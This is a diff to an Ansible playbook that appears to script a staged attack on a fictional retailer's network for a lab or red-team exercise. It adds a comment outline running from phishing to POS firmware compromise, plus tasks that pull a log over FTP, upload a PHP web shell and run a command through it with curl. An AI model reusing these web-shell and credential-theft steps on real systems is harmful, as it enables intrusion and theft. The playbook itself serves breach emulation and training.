@@ -1,7 +1,16 @@
 ---
 #
-# phishing inject
+# Stage I: Initial compromise (phishing inject)
+#     1. Send phishing email
+#     2. Download malicious software
+#     3. Obtain contractor's account username and password
+#     4. Login to Bullseye webserver as contractor
+#     5. Upload shell file to implement command injection 
+#     6. Run system command as root on web server
+#     7. Inject malicious software on POS firmware
+#     8. Obtain credentials
 #
+
 - name: phishing inject
   hosts: blackhat
   tasks:
@@ -23,3 +32,10 @@
   tasks:
     - name: download log file from ftp
       raw: wget --user=anonymous --password='contractor@fazio.com' ftp://ftp.fazio.com:21/upload/logs.txt
+- name: implement shell injection to webserver
+  hosts: blackhat
+  tasks:
+    - name: log in web server and upload shell file
+      raw: php shellinject.php logs.txt 10.0.0.16 shell.php
+    - name: run shell command as root on web server
+      raw: curl -X GET 10.0.0.16/images/shell.php\?cmd\=ls 
